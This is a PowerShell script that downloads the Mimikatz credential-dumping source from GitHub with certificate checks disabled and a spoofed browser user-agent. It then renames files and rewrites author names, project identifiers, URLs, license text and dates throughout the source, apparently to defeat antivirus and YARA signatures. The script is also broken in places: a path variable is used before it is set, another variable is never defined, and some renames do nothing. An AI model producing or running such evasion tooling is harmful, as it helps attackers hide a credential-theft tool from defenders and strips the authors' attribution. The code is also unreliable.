[CmdletBinding()] Param()

Write-Verbose "Downloading......"

$Domain = ""
$User = ""
$Password = ""

[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

$webClient = New-Object System.NET.WebClient
$webClient.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3578.108 Safari/537.36")
$mimiURL = "https://github.com/gentilkiwi/mimikatz/archive/master.zip"
$destMimi = (Get-Location).Path + "\mimikatz-master.zip"

$webClient.DownloadFile($mimiURL, $destMimi)


Write-Verbose "Saving to `n`t$destKatz `n`t$destMimi"
Expand-Archive $destMimi ($destMimi -replace ".zip")

Add-Type -AssemblyName System.IO.Compression.FileSystem
function Unzip {
    param([string]$zipfile, [string]$outpath)
    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
}

$mimikatz =  -join ((97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
Get-ChildItem -recurse $mimipath | Where-Object { $_.name -match "mimikatz" } | Rename-Item -NewName { $_.name -replace "mimikatz", "$mimikatz" }
$mimilib =  -join ((97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
Get-ChildItem -recurse $mimipath | Where-Object { $_.name -match "mimilib" } | Rename-Item -NewName { $_.name -replace "mimilib", "mimilib" }
$mimidrv =  -join ((97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
Get-ChildItem -recurse $mimipath | Where-Object { $_.name -match "mimidrv" } | Rename-Item -NewName { $_.name -replace "mimidrv", "mimidrv" }
$mimilove =  -join ((97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
Get-ChildItem -recurse $mimipath | Where-Object { $_.name -match "mimilove" } | Rename-Item -NewName { $_.name -replace "mimilove", "mimilove" }
$mimispool =  -join ((97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
Get-ChildItem -recurse $mimipath | Where-Object { $_.name -match "mimispool" } | Rename-Item -NewName { $_.name -replace "mimispool", "mimispool" }
$kuhl =  -join ((97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
Get-ChildItem -recurse $mimipath | Where-Object { $_.name -match "mimikatz" } | Rename-Item -NewName { $_.name -replace "kuhl", "$kuhl" }
$kull =  -join ((97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
Get-ChildItem -recurse $mimipath | Where-Object { $_.name -match "mimilib" } | Rename-Item -NewName { $_.name -replace "kull", "$kull" }


$mimipath = (get-location).path + "\mimikatz-master"
$allfiles = Get-ChildItem $mimipath -recurse | Where-Object { $_.Attributes -notmatch 'directory' } | `
             Where-Object { $_.Extension -match '\.c|\.cs|\.cmd|\.def|\.filters|\.h|\.idl|\.rc|\.sln|\.tlog|\.vcxproj|\.yar'  }
  foreach ($file in $allfiles) {
        (Get-Content $file.PSPath) | `
        ForEach-Object { $_ -replace "Benjamin", "Stan S. Stanman"`
							-replace "DELPY", "LeChucks" `
							-replace "gentil", "Octothorpe" `
							-replace "gentilkiwi", "Draggle" `
							-replace "oe.eo", "Griswold Goodsoup" `
							-replace ".letoux", "Guybrush Threepwood" `
							-replace "gmail", "Skully" `
							-replace "https://blog.gentilkiwi.com", "Sozzled" `
							-replace "https://creativecommons.org/licenses/by/4.0/", "Firkin" `
							-replace "Vincent", "Fartlek" `
							-replace "LE TOUX", "Spondulicks" `
							-replace "vincent.letoux@gmail.com", "Oxter" `
							-replace "https://pingcastle.com", "Yemele" `
							-replace "https://mysmartlogon.com", "Spondulicks" `
							-replace "2007", "2023" `
							-replace "2021", "2023" `
							#
							-replace "kiwi", "fruity" `
							-replace "mimikatz", "$mimikatz" `
							-replace "mimilib", "dinolib" `
							-replace "mimidrv", "dinodrv" `
							-replace "mimilove", "dinolove" `
							-replace "mimispool", "dinospool" `
							-replace "_POWERKATZ", "_DINOCATS" `
						} | `
        Set-Content $file.PSPath
    }
